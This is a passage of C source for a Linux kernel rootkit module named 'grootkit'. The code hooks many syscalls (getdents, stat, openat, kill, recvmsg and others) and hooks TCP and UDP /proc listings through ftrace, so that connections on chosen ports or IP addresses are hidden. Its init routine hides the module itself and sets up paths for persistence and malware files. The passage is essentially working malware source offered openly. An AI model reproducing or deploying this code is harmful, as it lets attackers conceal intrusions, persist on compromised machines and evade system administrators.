asmlinkage int stat_hook(const char __user *filename, struct stat __user *statbuf) {
    int return_value = stat_base(filename, statbuf);
#endif
    if (return_value != 0) return return_value;
    return (int)new_openat(filename, (long)return_value, 0);
}

/*
    This function hooks sys_newstat syscall.
*/
#ifdef PTREGS_SYSCALL_STUBS
asmlinkage int newstat_hook(const struct pt_regs *regs) {
    char *filename = (char *)regs->di;
    int return_value = newstat_base(regs);
#else
asmlinkage int newstat_hook(const char __user *filename, struct stat __user *statbuf) {
    int return_value = newstat_base(filename, statbuf);
#endif
    if (return_value != 0) return return_value;
    return (int)new_openat(filename, (long)return_value, 0);
}

/*
    This function hide TCP connection with
    specific port or IPv4 address.
*/
asmlinkage long tcp_seq_show_hook(struct seq_file *seq, void *s, tcp_seq_show_signature function) {
    if (s != SEQ_START_TOKEN) {
        struct sock *socket = (struct sock *)s;
        unsigned int s1_ip_address;
        unsigned int s2_ip_address;
        unsigned short s_source_port;
        unsigned short s_destination_port;
        int is_ipv4 = function == tcp4_seq_show_base || function == udp4_seq_show_base;

        if (socket->sk_state == TCP_TIME_WAIT) {
            struct inet_timewait_sock *inet = (struct inet_timewait_sock *)s;
            if (is_ipv4) {
                s1_ip_address = inet->tw_daddr;
                s2_ip_address = inet->tw_rcv_saddr;
            }
            s_source_port = inet->tw_sport;
            s_destination_port = inet->tw_dport;
        } else if (socket->sk_state == TCP_NEW_SYN_RECV) {
            struct inet_request_sock *inet = (struct inet_request_sock *)s;
            if (is_ipv4) {
                s1_ip_address = inet->ir_rmt_addr;
                s2_ip_address = inet->ir_loc_addr;
            }
            s_source_port = inet->ir_num;
            s_destination_port = inet->ir_rmt_port;
        } else {
            struct inet_sock *inet = (struct inet_sock *)socket;
            if (is_ipv4) {
                s1_ip_address = inet->inet_daddr;
                s2_ip_address = inet->inet_rcv_saddr;
            }
            s_destination_port = inet->inet_dport;
            s_source_port = inet->inet_sport;
        }

        if (
            (source_port && source_port == s_source_port) ||
            (destination_port && destination_port == s_destination_port) ||
            (is_ipv4 && ip_address &&
                (ip_address == s1_ip_address || ip_address == s2_ip_address)
            )
        ) {
            return 0;
        }
    }

    return function(seq, s);
}

/*
    This function hooks tcp4_seq_show_hook to hide TCP connections.
*/
asmlinkage long tcp4_seq_show_hook(struct seq_file *seq, void *s) {
    return tcp_seq_show_hook(seq, s, tcp4_seq_show_base);
}

/*
    This function hooks tcp6_seq_show_hook to hide TCP connections.
*/
asmlinkage long tcp6_seq_show_hook(struct seq_file *seq, void *s) {
    return tcp_seq_show_hook(seq, s, tcp6_seq_show_base);
}

/*
    This function hooks udp4_seq_show_hook to hide TCP connections.
*/
asmlinkage long udp4_seq_show_hook(struct seq_file *seq, void *s) {
    return tcp_seq_show_hook(seq, s, udp4_seq_show_base);
}

/*
    This function hooks udp6_seq_show_hook to hide TCP connections.
*/
asmlinkage long udp6_seq_show_hook(struct seq_file *seq, void *s) {
    return tcp_seq_show_hook(seq, s, udp6_seq_show_base);
}

/*
    Define hook structure for xxpX_seq_show symbols.
*/
struct ftrace_hook tcp4_seq_show_struct = {"tcp4_seq_show", tcp4_seq_show_hook, &tcp4_seq_show_base, 0, {}};
struct ftrace_hook tcp6_seq_show_struct = {"tcp6_seq_show", tcp6_seq_show_hook, &tcp6_seq_show_base, 0, {}};
struct ftrace_hook udp6_seq_show_struct = {"udp6_seq_show", udp6_seq_show_hook, &udp6_seq_show_base, 0, {}};
struct ftrace_hook udp4_seq_show_struct = {"udp4_seq_show", udp4_seq_show_hook, &udp4_seq_show_base, 0, {}};

/*
    This function changes RIP register to call hooked function.
*/
static void notrace function_hook(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *regs) {
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);

    if(!within_module(parent_ip, THIS_MODULE))
        regs->regs.ip = (unsigned long) hook->function;
}

/*
    This function hooks a kernel symbol.
*/
void *symbol_hooking(struct ftrace_hook *hook) {
    hook->address = (unsigned long)resolve_kernel_symbol(hook->name);
    if (hook->address == 0) {
        return (void *)hook->address;
    }
    *((unsigned long*) hook->original) = hook->address;

    hook->ops.func = function_hook;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_RECURSION | FTRACE_OPS_FL_IPMODIFY;

    int error = ftrace_set_filter_ip(&hook->ops, hook->address, 0, 0);
    if (error) {
        printk(KERN_DEBUG "Error hooking '%s' symbol (ftrace_set_filter_ip)\n", hook->name);
        return (void *)hook->address;
    }

    error = register_ftrace_function(&hook->ops);
    if (error) {
        printk(KERN_DEBUG "Error hooking '%s' symbol (register_ftrace_function)\n", hook->name);
        return (void *)hook->address;
    }

    return (void *)hook->address;
}

/*
    This function unhooks a kernel symbol.
*/
void symbol_unhooking(struct ftrace_hook *hook) {
    if (unregister_ftrace_function(&hook->ops)) {
        printk(KERN_DEBUG "Error unhooking '%s' symbol (unregister_ftrace_function)\n", hook->name);
    }

    if (ftrace_set_filter_ip(&hook->ops, hook->address, 1, 0)) {
        printk(KERN_DEBUG "Error unhooking '%s' symbol (ftrace_set_filter_ip)\n", hook->name);
    }
}

/*
    This function generates the full file path from directory and filename.
*/
void get_full_path(char* full_file_path, char* directory, char* filename) {
    strcat(full_file_path, directory);
    strcat(full_file_path, "/");
    strcat(full_file_path, filename);
}

/*
    This function is launched on module load.
*/
static int __init grootkit_init(void) {
    smallest_pid = current->pid;
    protect_and_hide();
    getdents64_base = syscall_hooking((unsigned long)getdents64_hook, (unsigned int)__NR_getdents64);
    newfstatat_base = syscall_hooking((unsigned long)newfstatat_hook, (unsigned int)__NR_newfstatat);
    getdents_base = syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
    // newfstat_base = syscall_hooking((unsigned long)newfstat_hook, (unsigned int)__NR_newfstat);
    // newlstat_base = syscall_hooking((unsigned long)newlstat_hook, (unsigned int)__NR_newlstat);
    recvmsg_base = syscall_hooking((unsigned long)recvmsg_hook, (unsigned int)__NR_recvmsg);
    // pread64_base = syscall_hooking((unsigned long)pread64_hook, (unsigned int)__NR_pread64);
    // newstat_base = syscall_hooking((unsigned long)newstat_hook, (unsigned int)__NR_newstat);
    openat_base = syscall_hooking((unsigned long)openat_hook, (unsigned int)__NR_openat);
    mkdir_base = syscall_hooking((unsigned long)mkdir_hook, (unsigned int)__NR_mkdir);
    fstat_base = syscall_hooking((unsigned long)fstat_hook, (unsigned int)__NR_fstat);
    lstat_base = syscall_hooking((unsigned long)lstat_hook, (unsigned int)__NR_lstat);
    statx_base = syscall_hooking((unsigned long)statx_hook, (unsigned int)__NR_statx);
    close_base = syscall_hooking((unsigned long)close_hook, (unsigned int)__NR_close);
    stat_base = syscall_hooking((unsigned long)stat_hook, (unsigned int)__NR_stat);
    kill_base = syscall_hooking((unsigned long)kill_hook, (unsigned int)__NR_kill);
    open_base = syscall_hooking((unsigned long)open_hook, (unsigned int)__NR_open);
    // read_base = syscall_hooking((unsigned long)read_hook, (unsigned int)__NR_read);

    tcp4_seq_show_base = symbol_hooking(&tcp4_seq_show_struct);
    tcp6_seq_show_base = symbol_hooking(&tcp6_seq_show_struct);
    udp4_seq_show_base = symbol_hooking(&udp4_seq_show_struct);
    udp6_seq_show_base = symbol_hooking(&udp6_seq_show_struct);

    malware_directory_length = strlen(rootkitdirectory);
    get_full_path(grootkit_filepath, rootkitdirectory, rootkitfile);
    get_full_path(persistence_filepath, persistencedirectory, persistencefile);

    for (int index = 0; index < malwarefiles_number; index += 1) {
        get_full_path(malwares_filespaths[index], rootkitdirectory, malwarefiles[index]);
    }

    return 0;
}

/*
    This function is launched on module unload.
*/
static void __exit grootkit_exit(void) {
    syscall_hooking((unsigned long)getdents64_base, (unsigned int)__NR_getdents64);
    syscall_hooking((unsigned long)newfstatat_base, (unsigned int)__NR_newfstatat);
    syscall_hooking((unsigned long)getdents_hook, (unsigned int)__NR_getdents);
    // syscall_hooking((unsigned long)newfstat_base, (unsigned int)__NR_newfstat);
    // syscall_hooking((unsigned long)newlstat_base, (unsigned int)__NR_newlstat);
    syscall_hooking((unsigned long)recvmsg_base, (unsigned int)__NR_recvmsg);
    // syscall_hooking((unsigned long)newstat_base, (unsigned int)__NR_newstat);
    syscall_hooking((unsigned long)openat_base, (unsigned int)__NR_openat);
    syscall_hooking((unsigned long)mkdir_base, (unsigned int)__NR_mkdir);
    syscall_hooking((unsigned long)fstat_base, (unsigned int)__NR_fstat);
    syscall_hooking((unsigned long)lstat_base, (unsigned int)__NR_lstat);
    syscall_hooking((unsigned long)statx_base, (unsigned int)__NR_statx);
    syscall_hooking((unsigned long)close_base, (unsigned int)__NR_close);
    syscall_hooking((unsigned long)stat_base, (unsigned int)__NR_stat);
    syscall_hooking((unsigned long)open_base, (unsigned int)__NR_open);
    syscall_hooking((unsigned long)kill_base, (unsigned int)__NR_kill);

    symbol_unhooking(&tcp4_seq_show_struct);
    symbol_unhooking(&tcp6_seq_show_struct);
    symbol_unhooking(&udp6_seq_show_struct);
    symbol_unhooking(&udp4_seq_show_struct);

    if (pread64_base != NULL) syscall_hooking((unsigned long)pread64_base, (unsigned int)__NR_pread64);
    if (read_base != NULL) syscall_hooking((unsigned long)read_base, (unsigned int)__NR_read);
}

module_init(grootkit_init);
module_exit(grootkit_exit);
